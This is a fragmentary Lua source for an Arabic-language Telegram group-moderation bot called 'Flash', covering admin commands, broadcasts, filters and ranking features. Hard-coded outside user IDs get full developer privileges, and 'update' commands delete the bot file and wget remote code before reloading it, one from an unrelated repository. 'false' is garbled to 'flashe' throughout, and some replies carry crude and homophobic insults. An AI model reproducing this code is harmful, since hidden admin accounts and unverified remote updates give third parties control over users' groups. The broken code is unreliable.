...
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = flashe, name = "Info"})  
else  
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./flash.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S flash -X kill
screen -S flash ./flash
done
]])  
file:close() 
...
print(serpent.block(value, {comment=flashe}))   
end 
sudo_users = {SUDO,1488653639,1444059892,1032413864}   
...
if hash or SudoBot(msg) or DevflashW(msg) or Bot(msg)  then  
return true  
else  
return flashe  
end  
...
if hash or SudoBot(msg) or DevflashW(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return flashe 
end 
...
if hash or SudoBot(msg) or DevflashW(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return flashe 
end 
...
if hash or SudoBot(msg) or DevflashW(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return flashe    
end 
...
if hash or SudoBot(msg) or DevflashW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return flashe    
end 
...
if hash or SudoBot(msg) or DevflashW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return flashe    
end 
...
if hash or SudoBot(msg) or DevflashW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return flashe 
end 
...
var = true  
elseif tonumber(user_id) == tonumber(1444059892) then
var = true 
...
function s_api(web) 
local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return flashe end if not req.ok then return flashe end return req 
end 
...
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = flashe response.selective = flashe  local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end
...
if data.first_name_ ~= flashe then
local UserName = (data.username_ or "suorsflash")
...
local flash_Msg = ''  
if msgs < 100 then 
flash_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
flash_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
flash_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
flash_Msg = 'متفاعل' 
elseif msgs < 1200 then 
flash_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
flash_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
flash_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
flash_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
flash_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
flash_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
flash_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
flash_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
flash_Msg = 'رب التفاعل'  
end 
return flash_Msg 
end
...
local response = nil 
options.redirect = flashe 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return flashe, code 
end 
...
if data.messages_[0] ~= flashe then
...
--------------------------------------------------------------------------------------------------------------
function Sourceflash(msg,data) -- بداية العمل
if msg then
...
if text == '/start' then  
if AddChannel(msg.sender_user_id_) == flashe then
...
Sourceflashr = '❃∫ اهلا عزيزي\n ❃∫ انا بوت اسمي '..Namebot..'\n ❃∫ اختصاصي حمايه الجروبات\n ❃∫ من تكرار والسبام والتوجيه والخ…\n ❃∫ لتفعيلي اتبع الاخطوات…↓\n ❃∫ اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع »{ منشئ او المشرفين } بتفعيل فقط\n[ ❃∫ [قناة سورس البوت](http://t.me/suorsflash)'
end 
send(msg.chat_id_, msg.id_, Sourceflashr) 
end
end
database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
return flashe
end
if not DevflashW(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevflashW(msg) and msg.reply_to_message_id_ ~= 0  then    
...
send(msg.chat_id_, msg.id_,flash_Msg) 
return flashe  
end 
if text then    
...
if text == 'تفعيل التواصل ❃' and DevflashW(msg) then  
...
if text == 'تعطيل التواصل ❃' and DevflashW(msg) then  
...
if text == 'تفعيل البوت الخدمي ❃' and DevflashW(msg) then  
...
if text == 'تعطيل البوت الخدمي ❃' and DevflashW(msg) then  
...
if text == 'ضع كليشه ستارت ❃' and DevflashW(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ❃∫ ارسل لي الكليشه الان')
return flashe
end
if text == 'حذف كليشه ستارت ❃' and DevflashW(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ❃∫ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر ❃' and DevflashW(msg) then 
...
if text == 'تحديث السورس ❃' and DevflashW(msg) then 
os.execute('rm -rf flash.lua')
os.execute('wget https://raw.githubusercontent.com/BOYKATEAM/BOYKA/master/boyk.lua')
send(msg.chat_id_, msg.id_,' ❃∫ تم تحديث السورس \n ❃∫ لديك اخر اصدار لسورس فلاش\n ❃∫ الاصدار » { 1.3v}')
dofile('flash.lua')  
end
if text == 'الاصدار ❃' and DevflashW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❃∫ اصدار سورس فلاش \n ❃∫ الاصدار »{ 1.3v}')
end
if text == 'قناه تحديثات البوت ❃' and DevflashW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❃∫ [تحديثات البوت](t.me/Q_Y_4) \n ❃∫ [قناه السورس](t.me/suorsflash)')
end
if text == "ضع اسم للبوت ❃" and DevflashW(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ❃∫ ارسل اليه الاسم الان ")
return flashe
end
if text == 'الاحصائيات ❃' and DevflashW(msg) then 
...
if text == 'المشتركين ❃' and DevflashW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ❃∫ المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الجروبات ❃' and DevflashW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ❃∫ الجروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ❃") and DevflashW(msg) then
...
if text == ("قائمه العام ❃") and DevflashW(msg) then
...
if text == ("قائمه الكتم العام ❃") and DevflashW(msg) then
...
if text=="اذاعه خاص ❃" and msg.reply_to_message_id_ == 0 and DevflashW(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ❃∫ ارسل الان اذاعتك؟ \n ❃∫ للخروج ارسل الغاء ")
return flashe
end 
if text=="اذاعه ❃" and msg.reply_to_message_id_ == 0 and DevflashW(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ❃∫ ارسل الان اذاعتك؟ \n ❃∫ للخروج ارسل الغاء ")
return flashe
end  
if text=="اذاعه بالتثبيت ❃" and msg.reply_to_message_id_ == 0 and DevflashW(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ❃∫ ارسل الان اذاعتك؟ \n ❃∫ للخروج ارسل الغاء ")
return flashe
end 
if text=="اذاعه بالتوجيه ❃" and msg.reply_to_message_id_ == 0  and DevflashW(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ❃∫ ارسل لي التوجيه الان")
return flashe
end 
if text=="اذاعه بالتوجيه خاص ❃" and msg.reply_to_message_id_ == 0  and DevflashW(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ❃∫ ارسل لي التوجيه الان")
return flashe
end 
if text == 'كلب نسخه الاحتياطيه ❃' and DevflashW(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ❃" and DevflashW(msg) then 
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "تنظيف الجروبات ❃" and DevflashW(msg) then 
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,'❃∫  عدد الجروبات الان » { '..#group..' }'..flashk..''..flash..'\n❃∫  الان عدد الجروبات الحقيقي » { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevflashW(msg) then
...
usertext = '\n ❃∫ العضو » ['..result.title_..'](t.me/'..(username or 'suorsflash')..')'
status  = '\n ❃∫ تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevflashW(msg) then
...
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'suorsflash')..')'
status  = '\n ❃∫ تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevflashW(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevflashW(msg) then
...
local flash1_Msg = database:get(bot_id.."flash1:Add:Filter:Rp2"..text..msg.chat_id_)   
if flash1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❃∫ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'suorsflash')..') \n ❃∫ '..flash1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return flashe
end,nil)
end
...
return flashe  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == flashe then
...
--------------------------------------------------------------------------------------------------------------
if flash_Msg and not Special(msg) then  
local flash_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if flash_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= flashe then
send(msg.chat_id_,0," ❃∫ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ❃∫ ["..flash_Msg.."] \n")
else
send(msg.chat_id_,0," ❃∫ العضو : {["..data.first_name_.."](T.ME/suorsflash)}\n ❃∫ ["..flash_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return flashe
...
send(msg.chat_id_,0, " ❃∫ عذرا » {["..data.first_name_.."](T.ME/suorsflash)}\n ❃∫ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return flashe   
...
if msg.can_be_deleted_ == flashe then 
send(msg.chat_id_, msg.id_,' ❃∫ عذرا يرجى ترقيه البوت مشرف !')
return flashe  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevflashW(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevflashW(msg) then
...
os.execute('rm -rf flash.lua')
os.execute('wget https://raw.githubusercontent.com/flashTEAM/flash/master/flash.lua')
send(msg.chat_id_, msg.id_,' ❃∫ تم تحديث السورس \n ❃∫ لديك اخر اصدار لسورس فلاش\n ❃∫ الاصدار » { 1.3v}')
dofile('flash.lua')  
end

if text and text:match("^تغير الاشتراك$") and DevflashW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ❃∫ حسنآ ارسل لي معرف القناة')
return flashe  
end
if text and text:match("^تغير رساله الاشتراك$") and DevflashW(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ❃∫ حسنآ ارسل لي النص الذي تريده')
return flashe  
end
if text == "حذف رساله الاشتراك ❃" and DevflashW(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ❃∫ تم مسح رساله الاشتراك ")
return flashe  
end
if text and text:match("^وضع قناة الاشتراك ❃$") and DevflashW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ❃∫ حسنآ ارسل لي معرف القناة')
return flashe  
end
if text == "تفعيل الاشتراك الاجباري ❃" and DevflashW(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري ❃" and DevflashW(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ❃∫ تم تعطيل الاشتراك الاجباري ")
return flashe  
end
if text == "الاشتراك الاجباري ❃" and DevflashW(msg) then  
...
database:sadd(bot_id.."flash:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."flash:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_flash = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_flash then 
names_flash = database:smembers(bot_id.."flash:blocname"..msg.chat_id_) or ""
if names_flash and names_flash[1] then 
for i=1,#names_flash do 
if name_flash:match("(.*)("..names_flash[i]..")(.*)") then 
...
database:set(bot_id.."flash:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."flash:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."flash:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."flash:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."flash:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_flasha_new(flash1,flash2)
if flash2 and flash2.first_name_ then 
if flash2.first_name_:match("(.*)"..database:get(bot_id.."flash:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."flash:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local flash_nnn = database:get(bot_id.."flash:nump"..msg.chat_id_) or 5
local flash_nnn2 = database:get(bot_id.."flash:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(flash_nnn2) == tonumber(flash_nnn) or tonumber(flash_nnn2) > tonumber(flash_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."flash:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "❃∫ عزيزي >>["..flash2.username_.."](https://t.me/"..(flash2.username_ or "suorsflash")..")\n❃∫ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."flash:teh"..msg.chat_id_).."} بجانب اسمك\n❃∫ عدد المحاولات المتبقيه {"..(tonumber(flash_nnn) - tonumber(flash_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_flasha_new)
end
end
...
local flashChengName = database:get(bot_id.."flash:Cheng:Name"..data.id_)
if not data.first_name_ then 
if flashChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..flashChengName..']')
database:del(bot_id.."flash:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if flashChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."flash:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local flashChengUserName = database:get(bot_id.."flash:Cheng:UserName"..data.id_)
if not data.username_ then 
if flashChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..flashChengUserName..']')
database:del(bot_id.."flash:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if flashChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."flash:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local flashChengPhoto = database:get(bot_id.."flash:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if flashChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."flash:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if flashChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."flash:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
Text = [[
𓇠——————F𝐥𝐚𝐬𝐡——————↠
 ❃∫ ↬[DEVELOPER](t.me/Q_Y_4)
𓇠——————F𝐥𝐚𝐬𝐡——————↠
 ❃∫ ↬[orders flash](t.me/surseflash)
𓇠——————F𝐥𝐚𝐬𝐡——————
]]
send(msg.chat_id_, msg.id_,Text)
return flashe
...
if text == 'رفع نسخه الاحتياطيه' and DevflashW(msg) then   
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ❃∫ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'suorsflash')..') \n ❃∫ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❃∫ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'suorsflash')..') \n ❃∫ تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevflashW(msg) then    
dofile('flash.lua')  
send(msg.chat_id_, msg.id_, ' ❃∫ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevflashW(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevflashW(msg) then
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^حظر عام @(.*)$")  and DevflashW(msg) then
...
if text and text:match("^حظر عام (%d+)$") and DevflashW(msg) then
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevflashW(msg) then
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevflashW(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevflashW(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevflashW(msg) then
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevflashW(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevflashW(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevflashW(msg) then
...
if text == 'الملفات' and DevflashW(msg) then
t = ' ❃∫ ملفات السورس فلاش ↓\n𓇠——————F𝐥𝐚𝐬𝐡——————↠ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
...
if DevflashW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/flashTEAM/Files_flash/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ❃∫ اهلا بك في متجر ملفات فلاش\n ❃∫ ملفات السورس ↓\n𓇠——————F𝐥𝐚𝐬𝐡——————↠\n\n"
local TextE = "\n𓇠——————F𝐥𝐚𝐬𝐡——————↠\n ❃∫ علامة تعني { ✓ } ملف مفعل\n ❃∫ علامة تعني { ✘ } ملف معطل\n ❃∫ قناة سورس فلاش ↓\n".." ❃∫ [اضغط هنا لدخول](t.me/suorsflash) \n"
local NumFile = 0
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevflashW(msg) then
...
send(msg.chat_id_, msg.id_," ❃∫ عذرا الملف لايدعم سورس فلاش \n") 
end
return flashe
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevflashW(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/flashTEAM/Files_flash/master/File_Bot/"..file)
if res == 200 then
...
if text == "مسح الملفات" and DevflashW(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ❃∫ تم مسح الملفات")
return flashe
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevflashW(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevflashW(msg) then
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if b.first_name_ == flashe then
send(msg.chat_id_, msg.id_," ❃∫ حساب المنشئ محذوف")
return flashe  
end
local UserName = (b.username_ or "suorsflash")
...
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == flashe and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
...
function Function_flash(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_flash, nil)
return flashe 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_flash, nil)
return flashe 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ❃∫ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'suorsflash')..')'
status  = '\n ❃∫ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ❃∫ العضو » '..userid..''
...
------------------------------------------------------------------------
if text == 'تنزيل المعرصين' and Mod(msg) then
...
-----------------------------------------------------
if text == 'تنزيل بقلبيات' and Mod(msg) then
...
---------
if text == ("رفع بقلبيه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local  statuss  = '\n ❃∫ تم رفع العضــو بقلبيه في الجروب \n ❃∫ تعال يحاته ممكن نتعرف'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if (text == ("تنزيل بقلبيه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'suorsflash')..')'
status  = '\n ❃∫ تم تنزيل العضــو بقلبيه من الجروب\n ❃∫ مشيي مو خوش حاتهه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if text == ("تاك للاحباب") and Mod(msg) then
local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
t = "\n ❃∫ قائمه حات الجروب \nٴ𓇠——————F𝐥𝐚𝐬𝐡——————↠ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» بقلبي [@"..username.."]\n"
else
t = t..""..k.."» بقلبي `"..v.."`\n"
end
end
if #list == 0 then
t = " ❃∫ مع الاسف لا يوجد احباب"
end
send(msg.chat_id_, msg.id_, t)
end
---------
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ❃∫ تم رفع العضــو بقلبي في الجروب \n ❃∫ تعال حبي بقلبي اديك بوسه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
-----------------------------------------------------
if text == 'تنزيل خول' and Mod(msg) then
...
if text == ("تاك للكلب") and Mod(msg) then
...
send(msg.chat_id_, msg.id_, ' ❃∫ تم تنزيل جميع القرود بالجروب')
end
...
-----------------------------------------------------
if text == 'تنزيل حصان' and Mod(msg) then
...
-----------------------------------------------------
if text == 'طلاق' and Mod(msg) then
database:del(bot_id..'Tele:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ❃∫ تم طلاقكم بنجاح كل واحد يشوفلو حد تاني')
end
if text == ("تاك للمتزوجين") and Mod(msg) then
local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
t = "\n ❃∫ قائمة المتزوجين الجروب \n𓇠——————F𝐥𝐚𝐬𝐡——————↠\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» المطلق[@"..username.."]\n"
else
t = t..""..k.."» المطلق "..v.."\n"
end
end
...
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=flashe&can_delete_messages=flashe&can_invite_users=True&can_restrict_members=flashe&can_pin_messages=True&can_promote_members=flashe")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return flashe
...
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=flashe&can_delete_messages=flashe&can_invite_users=True&can_restrict_members=flashe&can_pin_messages=True&can_promote_members=flashe")
else
send(msg.chat_id_, msg.id_, ' ❃∫  لا يوجد حساب بهاذا المعرف')
end
end
...
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=flashe&can_delete_messages=flashe&can_invite_users=flashe&can_restrict_members=flashe&can_pin_messages=flashe&can_promote_members=flashe")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return flashe
...
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=flashe&can_delete_messages=flashe&can_invite_users=flashe&can_restrict_members=flashe&can_pin_messages=flashe&can_promote_members=flashe")
else
send(msg.chat_id_, msg.id_, '⚠¦ لا يوجد حساب بهاذا المعرف')
end
end
...
database:set(bot_id.."flash1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return flashe  
end    
if text then   
local tsssst = database:get(bot_id.."flash1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ❃∫ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."flash1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."flash1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."flash1:List:Filter"..msg.chat_id_,text)  
return flashe  end  
end
if text then  
local test = database:get(bot_id.."flash1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ❃∫ تم منع الكلمه مع التحذير")  
database:del(bot_id.."flash1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."flash1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."flash1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."flash1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return flashe  end  
